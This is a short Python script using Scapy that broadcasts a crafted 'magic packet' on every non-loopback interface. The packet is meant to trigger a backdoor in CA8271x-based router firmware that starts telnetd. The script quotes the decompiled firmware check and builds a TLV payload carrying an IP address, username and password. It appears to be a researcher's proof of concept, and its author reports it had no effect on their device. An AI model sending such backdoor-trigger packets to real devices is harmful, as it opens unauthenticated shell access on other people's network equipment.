from scapy.all import *

#
# Test code to send magic packet.
# Based on oneliner from https://github.com/YuukiJapanTech/CA8271x
# It did nothing on my device so the backdoor might be fully disabled (or PON side only)
#

"""
  if ( !strcmp((const char *)a1, "MT_IP")
    && !dword_425680
    && !VOS_CfgParamGetByName("GOOGLE_ENGINEERING_BUILD", v39, 64)
    && !strcasecmp(v39, "yes") )
  {
    printf_s("start telnetd process\n");
    VOS_ExecStr(0, "/bin/telnetd&");
    dword_425680 = 1;
  }
"""

payload = (
    b"\x00\x00\x00\x01"           # command word = 1
    b"\x03"                       # typeNum = 3 TLVs
    b"\x01\x04\xc0\xa8\x01\x01"   # type=1 (IP),   len=4,  192.168.1.1
    b"\x02\x04test"               # type=2 (user), len=4,  "test"
    b"\x03\x08password"           # type=3 (pass), len=8,  "password"
)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff", type=0xc199) / Raw(load=payload)
[sendp(pkt, iface=i, count=1, verbose=False) for i in get_if_list() if i != "lo"]
